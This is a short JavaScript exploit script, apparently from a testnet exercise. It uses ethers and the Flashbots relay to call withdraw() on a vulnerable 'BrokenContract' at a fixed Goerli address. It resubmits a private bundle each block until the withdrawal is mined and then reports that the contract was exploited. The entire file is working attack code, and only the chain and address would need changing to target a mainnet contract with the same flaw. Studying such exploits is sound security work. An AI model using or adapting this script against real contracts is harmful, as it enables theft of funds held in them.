const ethers = require("ethers");
const flashbot = require("@flashbots/ethers-provider-bundle");
// load deployed contract's ABI: https://api-goerli.etherscan.io/api?module=contract&action=getabi&address=0xE417A0C129765A049FD360eDCD540629265e1Ae3
const brokenContractABI = require("../artifacts/contracts/BrokenContract.sol/contract_abi.json");
// address of the deployed contract
const brokenContractAddress = "0xE417A0C129765A049FD360eDCD540629265e1Ae3";
require('dotenv').config();

async function main() {
    // goerli network
    const CHAIN_ID = 5;
    // initialize provider
    const provider = new ethers.providers.AlchemyProvider(CHAIN_ID);
    // initialize wallet
    const wallet = new ethers.Wallet(process.env.FRESH_PK, provider);
    // initialize flashbots provider
    const flashbotProvider = await flashbot.FlashbotsBundleProvider.create(
        provider,
        wallet, 
        "https://relay-goerli.flashbots.net",
        "goerli"
    );
    // define the Broken Contract as an ethers object
    const BrokenContract = new ethers.Contract(brokenContractAddress, brokenContractABI, wallet);
    // call the `withdraw` function on BrokenContract
    const withdrawContractTx = await BrokenContract.populateTransaction.withdraw();
    // populate the transaction details 
    const tx = [
        {
            transaction: {
                // goerli testnet
                chainId: CHAIN_ID,
                // EIP-1559 style transaction
                type: 2,
                // no ether sent for this transaction
                value: ethers.utils.parseUnits("0", "ether"),
                // the necessary transaction calldata required to withdraw the funds from the smart contract
                data: withdrawContractTx.data,
                // the max fee per unit of gas (arbitrarily set)
                maxFeePerGas: ethers.utils.parseUnits("3", "gwei"),
                // the max miner tip to pay (arbitrarily set)
                maxPriorityFeePerGas: ethers.utils.parseUnits("3", "gwei"),
                // the transaction must interact directly with the deployed address on goerli network
                to: brokenContractAddress
            },
        // the defined wallet above will be used to interact with the smart-contract
        signer: wallet
        }
    ]
    // for each block we need to continously re-submit the flashbots bundle transaction until it is selected by a miner
    provider.on("block", async(blockNumber) => {
        console.log("Current Block: ", blockNumber);
        // send the bundle to the flashbots relayer for the closest next future block (ie: t + 1)
        const bundleSubmit = await flashbotProvider.sendBundle(tx, blockNumber+1)
        // wait until we receive a response and exit only once the transaction has been mined in the blockchain
        const waitResponse = await bundleSubmit.wait();
        if(waitResponse == 0) {
            console.log("Successfully exploited the smart-contract using flashbots.");
            process.exit();
        }    
    });
}

main();